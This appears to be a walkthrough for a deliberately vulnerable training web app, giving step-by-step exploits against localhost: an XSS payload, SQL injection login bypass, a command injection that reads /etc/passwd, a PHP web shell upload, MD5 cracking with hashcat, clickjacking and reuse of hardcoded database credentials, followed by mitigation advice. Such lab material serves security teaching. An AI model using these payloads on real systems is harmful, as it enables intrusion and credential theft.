# **Exploiting the Vulnerable Frontend and Backend**

This guide provides step-by-step instructions to exploit vulnerabilities intentionally introduced in the frontend and backend of the application. These examples are for **educational purposes only** and should not be used for malicious activities.

---

## **Frontend Exploits**

### **1. Cross-Site Scripting (XSS)**

#### **Exploit**
1. Navigate to the "Post a Comment" section on the application.
2. Enter the following payload in the comment text box:
   ```<script>alert('XSS Exploited!');</script>```
3. Click the **Post** button.
4. Observe an alert box popping up, demonstrating a successful XSS attack.

---

### **2. Insecure Local Storage**

#### **Exploit**
1. Enable the "Remember Me" option while logging in.
2. Open the browser’s Developer Tools:
   - In Chrome/Edge: Press `F12` or `Ctrl+Shift+I` and navigate to the "Application" tab.
   - In Firefox: Press `F12` or `Ctrl+Shift+I` and go to the "Storage" section.
3. Expand the **Local Storage** option and select the domain.
4. Extract the stored `username` and `password` values in plain text for reuse.

---

### **3. Sensitive Information in the DOM**

#### **Exploit**
1. Open the browser’s Developer Tools and go to the "Elements" tab.
2. Search for the exposed API key using the term `API Key`.
3. Copy the API key, such as `123456-SECRET-API-KEY`, for misuse in unauthorized API calls.

---

### **4. Improper Error Handling**

#### **Exploit**
1. Trigger an invalid backend request by entering an incorrect or malformed value in the login form.
   - For example, enter `username: 'invaliduser'` and `password: 'invalidpassword'`.
2. Observe raw error messages revealing backend details (e.g., `Cannot read property 'password' of undefined`).
3. Use this information to craft targeted backend attacks.

---

### **5. Clickjacking**

#### **Exploit**
1. Create an HTML file named `clickjacking.html` with the following content:
   ```html
   <html>
     <body>
       <h1>Clickjacking Demo</h1>
       <iframe src="http://localhost:3000" width="800" height="600" style="opacity: 0.5;"></iframe>
     </body>
   </html>
   ```
2. Open the file in a browser.
3. Interact with the embedded application through the iframe to observe how user inputs can be hijacked.

---

### **6. Excessive Client-Side Trust**

#### **Exploit**
1. Open the browser’s Developer Tools and go to the "Console" tab.
2. Execute the following command to bypass client-side validation:
   ```javascript
   document.querySelector('input[name="username"]').removeAttribute('required');
   ```
3. Submit the form without filling in the required fields.
4. Observe that the form submission is processed despite missing values.

---

## **Backend Exploits**

### **1. SQL Injection**

#### **Exploit**
1. Navigate to the login page.
2. Enter the following payload as the username:
   ```' OR 1=1 --```
3. Enter any value for the password.
4. Observe that you are logged in without valid credentials.

---

### **2. Hardcoded Credentials**

#### **Exploit**
1. Open the `backend/index.js` file.
2. Locate the database credentials:
   ```javascript
   const db = mysql.createConnection({
     host: 'localhost',
     user: 'root',
     password: 'password123',
     database: 'testdb',
   });
   ```
3. Use these credentials to directly access the database with tools like `mysql`:
   ```bash
   mysql -u root -p password123 -h localhost testdb
   ```

---

### **3. Weak Password Hashing**

#### **Exploit**
1. Extract a password hash from the database:
   - Example: `5f4dcc3b5aa765d61d8327deb882cf99`.
2. Use an MD5 hash cracking tool like `hashcat`:
   ```bash
   hashcat -m 0 -a 3 5f4dcc3b5aa765d61d8327deb882cf99
   ```
3. Observe the plaintext password (`password`) revealed.

---

### **4. Command Injection**

#### **Exploit**
1. Access the `/exec` endpoint with the following payload:
   ```http
   http://localhost:5000/exec?cmd=ls;cat /etc/passwd
   ```
2. Observe that the command executes and outputs sensitive server information.

---

### **5. File Upload Without Validation**

#### **Exploit**
1. Navigate to the file upload functionality.
2. Upload a PHP web shell with the following content:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Access the uploaded file via the browser:
   ```http
   http://localhost/uploads/webshell.php?cmd=ls
   ```
4. Execute arbitrary commands on the server.

---

### **6. Sensitive Information Exposure**

#### **Exploit**
1. Access the `/debug` endpoint.
2. Observe environment variables and sensitive configurations, such as database credentials or API keys.

---

## **Mitigation Recommendations**

- **Input Validation:** Sanitize all user inputs on both frontend and backend to prevent XSS and SQL Injection.
- **Secure Credentials:** Use environment variables to store sensitive credentials instead of hardcoding them.
- **Password Security:** Implement strong password hashing algorithms like bcrypt or Argon2.
- **Restrict Commands:** Validate and sanitize user input for shell commands or avoid executing commands entirely.
- **File Validation:** Validate file types and sanitize filenames before saving uploads.
- **Error Handling:** Display generic error messages and log detailed ones on the server.
- **CSP and X-Frame-Options:** Add headers to protect against XSS and clickjacking.
